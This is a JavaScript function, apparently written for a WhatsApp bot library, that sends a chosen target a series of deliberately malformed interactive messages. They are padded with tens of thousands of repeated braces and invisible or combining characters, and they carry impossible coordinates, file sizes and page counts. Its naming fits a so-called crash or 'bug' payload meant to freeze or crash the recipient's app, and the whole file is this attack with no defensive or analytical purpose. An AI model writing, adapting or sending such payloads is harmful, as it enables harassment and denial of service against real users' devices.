async function VerloadXDocuV1(target) {
  for (let r = 0; r < 1; r++) {
    try {
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "VaxzyNotWhyy👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });
    
    const msg1 = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "VaxzyOfficial🐉",
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 999999999,
                    degreesLongitude: -999999999,
                    name: '{'.repeat(100000),
                    address: '{'.repeat(100000),
                  },
                },
                contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "VaxzyOfficial🐉",
                },
                nativeFlowMessage: {
                  messageParamsJson: '{'.repeat(100000),
                },
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "𝄽‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌".repeat(70),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              }
            }
          }
        },
        {}
      );
      await sock.relayMessage(target, msg1.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
              },
            },
            body: {
              text: "VaxzyIsHere៚",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

    await sock.relayMessage(target, msg2.message, {
      messageId: msg.key.id,
      participant: { jid: target },
    });
      
    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyIsHere៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });
    
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}
}